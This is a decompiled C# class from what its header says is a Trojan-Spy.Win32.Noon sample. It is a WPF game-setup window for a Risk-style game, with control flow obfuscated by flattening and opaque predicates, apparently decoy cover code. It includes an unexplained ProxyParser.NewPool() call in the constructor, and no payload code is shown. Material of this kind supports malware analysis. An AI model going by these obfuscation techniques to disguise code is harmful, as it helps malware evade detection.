// Decompiled with JetBrains decompiler
// Type: RiskGame.Maps.ConsumerHelperMap
// Assembly: ArrayWithOff, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: C12E9A27-BEBF-4775-817A-6AC642D52B19
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-Spy.Win32.Noon.bcra-344266b0bd586b6b9907f1657c694060dd1bae1df9fda81d7433002d419fe4fa.exe

using ArrayWithOff.Authentication;
using ArrayWithOff.Collections;
using ArrayWithOff.Database;
using RiskGame.Game;
using RiskGame.Producers;
using RiskGame.Shared;
using RiskGame.Visitors;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Markup;
using System.Windows.Media;
using System.Windows.Shapes;

namespace RiskGame.Maps
{
  public class ConsumerHelperMap : Window, IComponentConnector, IStyleConnector
  {
    private List<Player> m_Info;
    private List<SolidColorBrush> _Record;
    private bool m_Params;
    private bool value;
    private bool _Status;
    internal StackPanel panel_MainUI;
    internal StackPanel stckPlayers;
    internal Button btnPlayer1Back;
    internal Rectangle rectPlayer1Color;
    internal Button btnPlayer1Forward;
    internal Label lblPlayer1;
    internal Border panelPlayer2;
    internal Button btnPlayer2Back;
    internal Rectangle rectPlayer2Color;
    internal Button btnPlayer2Forward;
    internal Label lblPlayer2;
    internal Border panelPlayer3;
    internal Button btnPlayer3Back;
    internal Rectangle rectPlayer3Color;
    internal Button btnPlayer3Forward;
    internal Label lblPlayer3;
    internal Border panelPlayer4;
    internal Button btnPlayer4Back;
    internal Rectangle rectPlayer4Color;
    internal Button btnPlayer4Forward;
    internal Label lblPlayer4;
    internal Border panelPlayer5;
    internal Button btnPlayer5Back;
    internal Rectangle rectPlayer5Color;
    internal Button btnPlayer5Forward;
    internal Label lblPlayer5;
    internal Border panelPlayer6;
    internal Button btnPlayer6Back;
    internal Rectangle rectPlayer6Color;
    internal Button btnPlayer6Forward;
    internal Label lblPlayer6;
    internal Label lblPlayer6Type;
    internal ComboBox cmbPlayer6;
    internal Button btnAddPlayer;
    internal ComboBox cmbMap;
    internal ComboBox cmbGameMode;
    internal CheckBox chkTimerEnabled;
    internal StackPanel panel_Time;
    internal Slider sldTime;
    internal StackPanel panel_Bias;
    internal Slider sldBias;
    internal CheckBox chkRandomise;
    internal Button btnNewGame;
    internal Button btnNewGameSettings;
    internal Label lblErrorAlt;
    internal TextBlock txtErrorAlt;
    internal StackPanel panel_LoadGame;
    internal DataGrid GameList;
    internal Label lblError;
    internal TextBlock txtError;
    internal DockPanel panel_Settings;
    internal Label lblMediaDetails;
    internal MediaElement mediaplayer;
    internal Slider slider_Volume;
    internal CheckBox chkMusicEnabled;
    internal CheckBox chkFullscreen;
    internal CheckBox chkHints;
    private bool m_Mock;

    public bool Music_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.m_Params;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          bool flag1;
          bool flag2;
          while (true)
          {
            switch (num2)
            {
              case 0:
                if (!flag2)
                {
                  if (value)
                    goto case 6;
                  else
                    goto label_5;
                }
                else
                {
                  this.mediaplayer.Play();
                  goto case 6;
                }
              case 1:
              case 2:
                if (flag1)
                {
                  try
                  {
                    ((Human) this.m_Info[0]).m_Publisher = value;
                    int num3 = 2;
                    while (true)
                    {
                      switch (num3)
                      {
                        case 0:
                        case 2:
                          goto label_13;
                        case 1:
                        case 3:
                          goto label_18;
                        default:
                          if (ConsumerHelperMap.CalculateContainer())
                          {
                            num3 = 3;
                            continue;
                          }
                          goto label_18;
                      }
                    }
label_13:
                    Human.QuerySerializer(this.m_Info[0] as Human);
                  }
                  catch
                  {
                    this.CheckSerializer("An error has occurred. Your music preferences have not been saved.");
                  }
label_18:;
                }
                flag2 = value;
                if (true)
                {
                  num2 = 0;
                  continue;
                }
                goto label_20;
              case 3:
                flag1 = this.m_Info.Count != 0;
                num2 = 2;
                continue;
              case 4:
              case 5:
                this.mediaplayer.Pause();
                goto case 6;
              case 6:
                this.m_Params = value;
                num2 = 7;
                continue;
              case 7:
                goto label_16;
              default:
                goto label_10;
            }
          }
label_5:
          num1 = 5;
          continue;
label_10:
          num1 = 6;
        }
label_16:
        return;
label_20:;
      }
    }

    public bool Hints_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this.value;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          while (true)
          {
            bool flag;
            switch (num2)
            {
              case 0:
              case 1:
                if (!flag)
                  break;
                goto case 2;
              case 2:
              case 4:
                try
                {
                  ((Human) this.m_Info[0]).policy = value;
                  int num3 = 2;
                  while (true)
                  {
                    switch (num3)
                    {
                      case 0:
                      case 2:
                        goto label_3;
                      case 1:
                      case 3:
                        goto label_8;
                      default:
                        num3 = 3;
                        continue;
                    }
                  }
label_3:
                  Human.QuerySerializer(this.m_Info[0] as Human);
                }
                catch
                {
                  this.CheckSerializer("An error has occurred. Your music preferences have not been saved.");
                }
label_8:
                break;
              case 3:
label_10:
                flag = this.m_Info.Count != 0;
                if (!ConsumerHelperMap.ResetContainer())
                {
                  num2 = 0;
                  continue;
                }
                goto case 0;
              case 5:
                goto label_12;
              default:
                goto label_15;
            }
            this.value = value;
            if (true)
              num2 = 5;
            else
              goto label_10;
          }
label_15:
          num1 = 4;
        }
label_12:;
      }
    }

    public bool Timer_enabled
    {
      [MethodImpl(MethodImplOptions.NoInlining)] get => this._Status;
      [MethodImpl(MethodImplOptions.NoInlining)] set
      {
        int num1 = 3;
        while (true)
        {
          int num2 = num1;
          bool flag;
          while (true)
          {
            switch (num2)
            {
              case 0:
              case 3:
                flag = !value;
                if (true)
                {
                  num2 = 2;
                  continue;
                }
                goto label_4;
              case 1:
              case 2:
                goto label_1;
              case 4:
                this._Status = value;
                num2 = 7;
                continue;
              case 5:
                goto label_4;
              case 6:
                this.sldTime.Value = 0.0;
                this.panel_Time.Visibility = Visibility.Collapsed;
                goto case 4;
              case 7:
                goto label_12;
              default:
                goto label_10;
            }
          }
label_1:
          if (flag)
          {
            this.sldTime.Minimum = 0.0;
            num1 = 6;
            continue;
          }
          this.sldTime.Minimum = 20.0;
          this.sldTime.Value = 30.0;
label_4:
          this.panel_Time.Visibility = Visibility.Visible;
          num1 = 4;
          continue;
label_10:
          num1 = 5;
        }
label_12:;
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public ConsumerHelperMap(List<Player> def, bool iscaller)
    {
      ProxyParser.NewPool();
      this.m_Info = new List<Player>();
      this._Record = new List<SolidColorBrush>()
      {
        Brushes.OrangeRed,
        Brushes.DeepSkyBlue,
        Brushes.LimeGreen,
        Brushes.Gold,
        Brushes.Red,
        Brushes.Violet,
        Brushes.Blue
      };
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.InitializeComponent();
      this.m_Info = def;
      this.StateChanged += new EventHandler(((ParamsPropertyCollection) Application.Current).CloneSerializer);
      this.DataContext = (object) this;
      this._Status = true;
      this.Music_enabled = ((Human) this.m_Info[0]).m_Publisher;
      this.Hints_enabled = ((Human) this.m_Info[0]).policy;
      if (this.m_Params)
        this.mediaplayer.Play();
      List<Human> config = new List<Human>();
      foreach (Player player in this.m_Info)
      {
        if (player is Human)
          config.Add(player as Human);
      }
      ObservableCollection<InitializerItemAuth> observableCollection = AuthenticationContainerProducer.NewModel(config);
      if (observableCollection == null || observableCollection.Count == 0)
      {
        this.panel_LoadGame.Visibility = Visibility.Collapsed;
        this.btnNewGameSettings.Visibility = Visibility.Visible;
        this.btnNewGame.Width = 150.0;
      }
      this.GameList.ItemsSource = (IEnumerable) observableCollection;
      this.lblPlayer1.Content = (object) this.m_Info[0].ResetExpression();
      if (this.m_Info.Count >= 2)
      {
        this.panelPlayer2.Visibility = Visibility.Visible;
        this.ListSerializer((object) this.btnPlayer2Forward);
        this.lblPlayer2.Content = (object) this.m_Info[1].ResetExpression();
        this.lblPlayer6.Content = (object) "Player 3";
      }
      if (this.m_Info.Count >= 3)
      {
        this.panelPlayer3.Visibility = Visibility.Visible;
        this.ListSerializer((object) this.btnPlayer3Forward);
        this.lblPlayer3.Content = (object) this.m_Info[2].ResetExpression();
        this.lblPlayer6.Content = (object) "Player 4";
      }
      if (this.m_Info.Count >= 4)
      {
        this.panelPlayer4.Visibility = Visibility.Visible;
        this.ListSerializer((object) this.btnPlayer4Forward);
        this.lblPlayer4.Content = (object) this.m_Info[3].ResetExpression();
        this.lblPlayer6.Content = (object) "Player 5";
      }
      if (this.m_Info.Count >= 5)
      {
        this.panelPlayer5.Visibility = Visibility.Visible;
        this.ListSerializer((object) this.btnPlayer5Forward);
        this.lblPlayer5.Content = (object) this.m_Info[4].ResetExpression();
        this.lblPlayer6.Content = (object) "Player 6";
      }
      if (this.m_Info.Count >= 6)
      {
        this.panelPlayer6.Visibility = Visibility.Visible;
        this.ListSerializer((object) this.btnPlayer6Forward);
        this.lblPlayer6.Content = (object) this.m_Info[5].ResetExpression();
        this.lblPlayer6Type.Visibility = Visibility.Visible;
        this.cmbPlayer6.Visibility = Visibility.Collapsed;
        this.btnAddPlayer.IsEnabled = false;
      }
      if (!iscaller)
        return;
      ((ParamsPropertyCollection) Application.Current).GetSerializer((Window) this);
      ((ParamsPropertyCollection) Application.Current).CalcSerializer((Window) this);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void InsertSerializer(object def, RoutedEventArgs token) => this.ListSerializer(def);

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void AddPlayer(object sender, RoutedEventArgs e)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        bool flag;
        Bridge bridge;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              flag = this.cmbPlayer6.SelectedIndex == 1;
              if (ConsumerHelperMap.CalculateContainer())
              {
                num2 = 4;
                continue;
              }
              goto label_2;
            case 1:
            case 4:
              if (flag)
              {
                this.CheckSerializer("AI is not yet implemented. Please select a human player.");
                if (!ConsumerHelperMap.ResetContainer())
                {
                  num2 = 5;
                  continue;
                }
                goto label_12;
              }
              else
                goto label_5;
            case 2:
              bridge.Show();
              num2 = 7;
              continue;
            case 5:
              goto label_14;
            case 6:
              goto label_2;
            case 7:
              goto label_12;
            default:
              goto label_9;
          }
        }
label_2:
        this.Close();
        num1 = 2;
        continue;
label_5:
        if (this.cmbPlayer6.SelectedIndex == 0)
        {
          bridge = new Bridge(this.m_Info, ((ParamsPropertyCollection) Application.Current).NewSerializer((Window) this));
          Application.Current.MainWindow = (Window) bridge;
          goto label_2;
        }
        else
          break;
label_9:
        num1 = 6;
      }
      return;
label_14:
      return;
label_12:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CollectSerializer(object res, RoutedEventArgs b)
    {
      int num1 = 2;
      Token token;
      while (true)
      {
        int num2 = num1;
        bool flag1;
        bool flag2;
        while (true)
        {
          switch (num2)
          {
            case 0:
              goto label_1;
            case 1:
            case 8:
              goto label_29;
            case 2:
              this.StartSerializer();
              if (!ConsumerHelperMap.ResetContainer())
              {
                num2 = 5;
                continue;
              }
              goto case 5;
            case 3:
            case 7:
              this.m_Info[2].Color = (SolidColorBrush) this.rectPlayer3Color.Fill;
              flag1 = this.m_Info.Count >= 4;
              if (true)
              {
                num2 = 9;
                continue;
              }
              goto label_4;
            case 4:
              goto label_4;
            case 5:
              if (this.m_Info.Count >= 2)
              {
                if (this.m_Info.Count == 2)
                {
                  num2 = 4;
                  continue;
                }
                goto label_5;
              }
              else
              {
                this.CheckSerializer("There must be at least two players to start a game.");
                if (true)
                {
                  num2 = 11;
                  continue;
                }
                goto case 10;
              }
            case 6:
              goto label_13;
            case 9:
              if (flag1)
                this.m_Info[3].Color = (SolidColorBrush) this.rectPlayer4Color.Fill;
              if (this.m_Info.Count >= 5)
                this.m_Info[4].Color = (SolidColorBrush) this.rectPlayer5Color.Fill;
              flag2 = this.m_Info.Count >= 6;
              goto case 10;
            case 10:
              if (flag2)
              {
                if (true)
                {
                  num2 = 0;
                  continue;
                }
                goto label_33;
              }
              else
                goto label_2;
            case 11:
              goto label_33;
            default:
              if (true)
              {
                num2 = 10;
                continue;
              }
              goto label_29;
          }
        }
label_1:
        this.m_Info[5].Color = (SolidColorBrush) this.rectPlayer6Color.Fill;
label_2:
        token = new Token(this.m_Info, this.chkRandomise.IsChecked.Value, (REGKIND) this.cmbMap.SelectedIndex, (GameMode) this.cmbGameMode.SelectedIndex, (int) this.sldTime.Value, this.sldBias.Value);
        num1 = 6;
        continue;
label_4:
        this.m_Info.Add((Player) new Service("Neutral"));
        this.ListSerializer((object) this.btnPlayer3Forward);
label_5:
        if (this.cmbMap.SelectedIndex != -1)
        {
          if (this.cmbGameMode.SelectedIndex != -1)
          {
            this.m_Info[0].Color = (SolidColorBrush) this.rectPlayer1Color.Fill;
            this.m_Info[1].Color = (SolidColorBrush) this.rectPlayer2Color.Fill;
            num1 = 7;
          }
          else
            break;
        }
        else
        {
          this.CheckSerializer("Please select a map.");
          num1 = 1;
        }
      }
      this.CheckSerializer("Please select a Gamemode.");
      return;
label_13:
      try
      {
        Application.Current.MainWindow = (Window) token;
        int num3 = 3;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 3:
              token.Show();
              goto case 1;
            case 1:
            case 2:
              this.Close();
              num3 = 4;
              continue;
            case 4:
              goto label_34;
            default:
              if (ConsumerHelperMap.CalculateContainer())
              {
                num3 = 2;
                continue;
              }
              goto label_18;
          }
        }
label_34:
        return;
label_18:
        return;
      }
      catch (Exception ex)
      {
        this.CheckSerializer("An error has occurred");
        return;
      }
label_29:
      return;
label_33:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ComputeSerializer(object first, RoutedEventArgs ivk)
    {
      int num1 = 5;
      Token token1;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              flag = this.txtError.Visibility == Visibility.Visible;
              num2 = 1;
              continue;
            case 1:
              goto label_8;
            case 2:
            case 3:
              goto label_1;
            case 4:
              goto label_11;
            case 6:
              goto label_15;
            default:
              if (true)
              {
                num2 = 2;
                continue;
              }
              goto label_15;
          }
        }
label_1:
label_2:
        AuthenticationContainerProducer instance = new AuthenticationContainerProducer();
        try
        {
          instance = AuthenticationContainerProducer.OrderModel(int.Parse(((InitializerItemAuth) this.GameList.SelectedItem).RestartModel()));
        }
        catch (CreatorItemAuth ex)
        {
          this.CheckSerializer("The selected game could not be loaded.");
        }
        catch (NullReferenceException ex)
        {
          this.CheckSerializer("Please select a game to load by clicking on the details of the game you wish to load and then 'Load Game'");
        }
        catch (Exception ex)
        {
          this.CheckSerializer("Something went wrong.");
        }
        Token token2 = new Token(instance);
        token2.WindowStartupLocation = WindowStartupLocation.CenterScreen;
        token1 = token2;
        num1 = 6;
        continue;
label_8:
        if (flag)
        {
          num1 = 4;
          continue;
        }
        goto label_2;
label_11:
        this.StartSerializer();
        goto label_1;
      }
label_15:
      try
      {
        Application.Current.MainWindow = (Window) token1;
        int num3 = 3;
        while (true)
        {
          switch (num3)
          {
            case 0:
            case 3:
              token1.Show();
              goto case 1;
            case 1:
            case 2:
              this.Close();
              if (ConsumerHelperMap.CalculateContainer())
              {
                num3 = 4;
                continue;
              }
              goto label_20;
            case 4:
              goto label_22;
            default:
              if (true)
              {
                num3 = 2;
                continue;
              }
              goto case 1;
          }
        }
label_22:
        return;
label_20:;
      }
      catch (Exception ex)
      {
        this.CheckSerializer("An error has occurred");
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void ListSerializer(object init)
    {
      int num1 = 12;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          bool flag1;
          Rectangle rectangle;
          Button button;
          bool flag2;
          bool flag3;
          bool flag4;
          int num3;
          switch (num2)
          {
            case 0:
              rectangle = !flag1 ? this.rectPlayer6Color : this.rectPlayer5Color;
              break;
            case 1:
            case 6:
label_5:
              if ((rectangle == this.rectPlayer3Color || rectangle.Fill != this.rectPlayer3Color.Fill) && (rectangle == this.rectPlayer4Color || rectangle.Fill != this.rectPlayer4Color.Fill))
              {
                if (rectangle != this.rectPlayer5Color)
                {
                  if (rectangle.Fill == this.rectPlayer5Color.Fill)
                    goto label_14;
                  else
                    goto label_8;
                }
                else
                  goto case 4;
              }
              else
                goto label_14;
            case 2:
              flag2 = true;
              num2 = 5;
              continue;
            case 3:
            case 11:
              if (flag4)
              {
                rectangle = this.rectPlayer3Color;
                break;
              }
              if (button.Name.Contains("4"))
              {
                rectangle = this.rectPlayer4Color;
                break;
              }
              flag1 = button.Name.Contains("5");
              num2 = 0;
              continue;
            case 4:
              num3 = rectangle == this.rectPlayer6Color ? 0 : (rectangle.Fill == this.rectPlayer6Color.Fill ? 1 : 0);
              goto label_15;
            case 5:
              goto label_23;
            case 7:
              if (flag3)
                goto case 9;
              else
                goto label_12;
            case 8:
              flag2 = false;
              if (true)
              {
                num2 = 9;
                continue;
              }
              goto case 7;
            case 9:
              flag2 = false;
              if (button.Name.Contains("1"))
              {
                rectangle = this.rectPlayer1Color;
                break;
              }
              if (button.Name.Contains("2"))
              {
                rectangle = this.rectPlayer2Color;
                break;
              }
              flag4 = button.Name.Contains("3");
              if (true)
              {
                num2 = 11;
                continue;
              }
              goto case 5;
            case 10:
              try
              {
                rectangle.Fill = (Brush) this._Record[this._Record.IndexOf((SolidColorBrush) rectangle.Fill) + 1];
                goto label_34;
              }
              catch (ArgumentOutOfRangeException ex)
              {
                rectangle.Fill = (Brush) this._Record[0];
                goto label_34;
              }
            case 12:
              button = (Button) init;
              num2 = 8;
              continue;
            case 13:
              goto label_35;
            default:
              if (true)
              {
                num2 = 1;
                continue;
              }
              goto label_39;
          }
          if (!button.Name.Contains("Forward"))
          {
            try
            {
              rectangle.Fill = (Brush) this._Record[this._Record.IndexOf((SolidColorBrush) rectangle.Fill) - 1];
            }
            catch (ArgumentOutOfRangeException ex)
            {
              rectangle.Fill = (Brush) this._Record[this._Record.Count - 1];
            }
            goto label_34;
          }
          else
            break;
label_14:
          num3 = 1;
label_15:
          if (num3 != 0)
            goto label_16;
label_23:
          flag3 = flag2;
          int num4 = 7;
          num2 = ConsumerHelperMap.ResetContainer() ? num4 : num4;
          continue;
label_34:
          if (rectangle != this.rectPlayer1Color && rectangle.Fill == this.rectPlayer1Color.Fill || rectangle != this.rectPlayer2Color && rectangle.Fill == this.rectPlayer2Color.Fill)
            goto label_14;
          else
            goto label_5;
        }
        num1 = 10;
        continue;
label_8:
        num1 = 4;
        continue;
label_12:
        num1 = 13;
        continue;
label_16:
        num1 = 2;
      }
label_35:
      return;
label_39:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CheckSerializer(string res)
    {
      int num1 = 0;
      if (true)
        goto label_7;
label_1:
      bool flag;
      int num2;
      if (flag)
      {
        num2 = 2;
      }
      else
      {
        this.lblError.Visibility = Visibility.Visible;
        goto label_9;
      }
label_6:
      num1 = num2;
label_7:
      while (true)
      {
        switch (num1)
        {
          case 0:
            goto label_3;
          case 1:
          case 4:
            goto label_1;
          case 2:
            goto label_4;
          case 3:
          case 5:
            goto label_9;
          case 6:
            goto label_10;
          default:
            num1 = 5;
            continue;
        }
      }
label_3:
      flag = this.panel_LoadGame.Visibility == Visibility.Collapsed;
      num2 = 4;
      goto label_6;
label_4:
      this.lblErrorAlt.Visibility = Visibility.Visible;
      this.txtErrorAlt.Text = res;
      return;
label_10:
      return;
label_9:
      this.txtError.Text = res;
      num2 = 6;
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void StartSerializer()
    {
      int num1 = 5;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 5:
              goto label_1;
            case 1:
              goto label_2;
            case 2:
            case 3:
              this.txtError.Text = "";
              num2 = 6;
              continue;
            case 4:
              if (!flag)
              {
                this.lblError.Visibility = Visibility.Collapsed;
                goto case 2;
              }
              else
                goto label_8;
            case 6:
              goto label_10;
            default:
              num2 = 2;
              continue;
          }
        }
label_1:
        flag = this.panel_LoadGame.Visibility == Visibility.Collapsed;
        num1 = 4;
        continue;
label_8:
        num1 = 1;
      }
label_2:
      this.lblErrorAlt.Visibility = Visibility.Collapsed;
      this.txtErrorAlt.Text = "";
      return;
label_10:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void InitializeComponent()
    {
      int num1 = 1;
      while (true)
      {
        int num2 = num1;
        bool mock;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 1:
              goto label_6;
            case 2:
              goto label_10;
            case 3:
              goto label_5;
            case 4:
              goto label_11;
            case 5:
              if (mock)
              {
                num2 = 4;
                continue;
              }
              goto label_1;
            case 6:
              goto label_9;
            default:
              num2 = 3;
              continue;
          }
        }
label_1:
        this.m_Mock = true;
label_5:
        Application.LoadComponent((object) this, new Uri("/ArrayWithOff;component/gamesetup.xaml", UriKind.Relative));
        num1 = 6;
        continue;
label_6:
        mock = this.m_Mock;
        num1 = 5;
      }
label_10:
      return;
label_11:
      return;
label_9:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [DebuggerNonUserCode]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IComponentConnector.Connect(int item_count, object connection)
    {
      int num1 = 13;
      if (false)
        return;
      while (true)
      {
        int num2;
        int num3;
        switch (num1)
        {
          case 0:
            switch (num2)
            {
              case 1:
                goto label_29;
              case 2:
                this.stckPlayers = (StackPanel) connection;
                num3 = 15;
                break;
              case 4:
                this.btnPlayer1Back = (Button) connection;
                if (true)
                {
                  num1 = 14;
                  continue;
                }
                goto label_68;
              case 5:
                this.rectPlayer1Color = (Rectangle) connection;
                num3 = 10;
                break;
              case 6:
                goto label_31;
              case 7:
                goto label_32;
              case 8:
                goto label_33;
              case 9:
                goto label_34;
              case 10:
                this.rectPlayer2Color = (Rectangle) connection;
                num1 = 9;
                continue;
              case 11:
                goto label_7;
              case 12:
                goto label_8;
              case 13:
                goto label_9;
              case 14:
                goto label_10;
              case 15:
                goto label_11;
              case 16:
                goto label_12;
              case 17:
                goto label_13;
              case 18:
                goto label_14;
              case 19:
                goto label_15;
              case 20:
                goto label_16;
              case 21:
                goto label_17;
              case 22:
                goto label_18;
              case 23:
                goto label_19;
              case 24:
                this.btnPlayer5Back = (Button) connection;
                num1 = 18;
                continue;
              case 25:
                goto label_23;
              case 26:
                goto label_24;
              case 27:
                this.lblPlayer5 = (Label) connection;
                num1 = 5;
                continue;
              case 28:
                goto label_62;
              case 29:
                goto label_63;
              case 30:
                this.rectPlayer6Color = (Rectangle) connection;
                num3 = 1;
                break;
              case 31:
                goto label_36;
              case 32:
                goto label_37;
              case 33:
                goto label_38;
              case 34:
                goto label_39;
              case 35:
                goto label_40;
              case 36:
                goto label_41;
              case 37:
                goto label_42;
              case 38:
                goto label_43;
              case 39:
                goto label_44;
              case 40:
                this.sldTime = (Slider) connection;
                num1 = 6;
                continue;
              case 41:
                goto label_65;
              case 42:
                this.sldBias = (Slider) connection;
                num3 = 12;
                break;
              case 43:
                goto label_48;
              case 44:
                this.btnNewGame = (Button) connection;
                num3 = 8;
                break;
              case 45:
                goto label_50;
              case 46:
                goto label_51;
              case 47:
                goto label_52;
              case 48:
                goto label_53;
              case 49:
                goto label_54;
              case 50:
                goto label_55;
              case 51:
                this.lblError = (Label) connection;
                if (true)
                {
                  num1 = 3;
                  continue;
                }
                goto label_57;
              case 52:
                goto label_2;
              case 53:
                goto label_3;
              case 54:
                this.lblMediaDetails = (Label) connection;
                if (true)
                {
                  num1 = 2;
                  continue;
                }
                goto label_5;
              case 55:
                goto label_58;
              case 56:
                goto label_59;
              case 57:
                goto label_60;
              case 58:
                this.chkFullscreen = (CheckBox) connection;
                num1 = 7;
                continue;
              case 59:
                goto label_21;
              default:
                this.m_Mock = true;
                num1 = 19;
                continue;
            }
            break;
          case 1:
            goto label_69;
          case 2:
            goto label_70;
          case 3:
            goto label_71;
          case 4:
            goto label_72;
          case 5:
            goto label_73;
          case 6:
            goto label_74;
          case 7:
            goto label_75;
          case 8:
label_57:
            this.btnNewGame.Click += new RoutedEventHandler(this.CollectSerializer);
            num3 = 17;
            break;
          case 9:
            goto label_76;
          case 10:
            goto label_77;
          case 11:
            goto label_78;
          case 12:
            goto label_79;
          case 13:
            num2 = item_count;
            num3 = 0;
            break;
          case 14:
            goto label_80;
          case 15:
            goto label_81;
          case 16:
            goto label_82;
          case 17:
            goto label_83;
          case 18:
            goto label_84;
          case 19:
            goto label_85;
          default:
            num3 = 11;
            break;
        }
        num1 = num3;
      }
label_2:
      this.txtError = (TextBlock) connection;
      return;
label_3:
      this.panel_Settings = (DockPanel) connection;
      return;
label_5:
      return;
label_7:
      this.btnPlayer2Forward = (Button) connection;
      return;
label_8:
      this.lblPlayer2 = (Label) connection;
      return;
label_9:
      this.panelPlayer3 = (Border) connection;
      return;
label_10:
      this.btnPlayer3Back = (Button) connection;
      return;
label_11:
      this.rectPlayer3Color = (Rectangle) connection;
      return;
label_12:
      this.btnPlayer3Forward = (Button) connection;
      return;
label_13:
      this.lblPlayer3 = (Label) connection;
      return;
label_14:
      this.panelPlayer4 = (Border) connection;
      return;
label_15:
      this.btnPlayer4Back = (Button) connection;
      return;
label_16:
      this.rectPlayer4Color = (Rectangle) connection;
      return;
label_17:
      this.btnPlayer4Forward = (Button) connection;
      return;
label_18:
      this.lblPlayer4 = (Label) connection;
      return;
label_19:
      this.panelPlayer5 = (Border) connection;
      return;
label_21:
      this.chkHints = (CheckBox) connection;
      return;
label_23:
      this.rectPlayer5Color = (Rectangle) connection;
      return;
label_24:
      this.btnPlayer5Forward = (Button) connection;
      return;
label_29:
      this.panel_MainUI = (StackPanel) connection;
      return;
label_31:
      this.btnPlayer1Forward = (Button) connection;
      return;
label_32:
      this.lblPlayer1 = (Label) connection;
      return;
label_33:
      this.panelPlayer2 = (Border) connection;
      return;
label_34:
      this.btnPlayer2Back = (Button) connection;
      return;
label_36:
      this.btnPlayer6Forward = (Button) connection;
      return;
label_37:
      this.lblPlayer6 = (Label) connection;
      return;
label_38:
      this.lblPlayer6Type = (Label) connection;
      return;
label_39:
      this.cmbPlayer6 = (ComboBox) connection;
      return;
label_40:
      this.btnAddPlayer = (Button) connection;
      this.btnAddPlayer.Click += new RoutedEventHandler(this.AddPlayer);
      return;
label_41:
      this.cmbMap = (ComboBox) connection;
      return;
label_42:
      this.cmbGameMode = (ComboBox) connection;
      return;
label_43:
      this.chkTimerEnabled = (CheckBox) connection;
      return;
label_44:
      this.panel_Time = (StackPanel) connection;
      return;
label_69:
      return;
label_84:
      return;
label_71:
      return;
label_72:
      return;
label_85:
      return;
label_74:
      return;
label_75:
      return;
label_76:
      return;
label_77:
      return;
label_73:
      return;
label_79:
      return;
label_83:
      return;
label_82:
      return;
label_78:
      return;
label_70:
      return;
label_81:
      return;
label_80:
      return;
label_48:
      this.chkRandomise = (CheckBox) connection;
      return;
label_50:
      this.btnNewGameSettings = (Button) connection;
      return;
label_51:
      this.lblErrorAlt = (Label) connection;
      return;
label_52:
      this.txtErrorAlt = (TextBlock) connection;
      return;
label_53:
      this.panel_LoadGame = (StackPanel) connection;
      return;
label_54:
      this.GameList = (DataGrid) connection;
      return;
label_55:
      ((ButtonBase) connection).Click += new RoutedEventHandler(this.ComputeSerializer);
      return;
label_58:
      this.mediaplayer = (MediaElement) connection;
      return;
label_59:
      this.slider_Volume = (Slider) connection;
      return;
label_60:
      this.chkMusicEnabled = (CheckBox) connection;
      return;
label_62:
      this.panelPlayer6 = (Border) connection;
      return;
label_63:
      this.btnPlayer6Back = (Button) connection;
      return;
label_65:
      this.panel_Bias = (StackPanel) connection;
      return;
label_68:;
    }

    [GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
    [EditorBrowsable(EditorBrowsableState.Never)]
    [DebuggerNonUserCode]
    [MethodImpl(MethodImplOptions.NoInlining)]
    void IStyleConnector.Connect(int version_key, object col)
    {
      int num1 = 4;
      int num2;
      EventSetter eventSetter;
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 4:
            num2 = version_key;
            num1 = 3;
            continue;
          case 1:
          case 3:
            if (num2 == 3)
            {
              eventSetter = new EventSetter();
              num1 = 5;
              continue;
            }
            goto label_9;
          case 2:
            eventSetter.Handler = (Delegate) new RoutedEventHandler(this.InsertSerializer);
            ((Style) col).Setters.Add((SetterBase) eventSetter);
            int num3 = 6;
            num1 = ConsumerHelperMap.ResetContainer() ? num3 : num3;
            continue;
          case 5:
            eventSetter.Event = ButtonBase.ClickEvent;
            goto case 2;
          case 6:
            goto label_5;
          default:
            num1 = 2;
            continue;
        }
      }
label_9:
      return;
label_5:;
    }

    internal static bool CalculateContainer() => true;

    internal static bool ResetContainer() => false;
  }
}
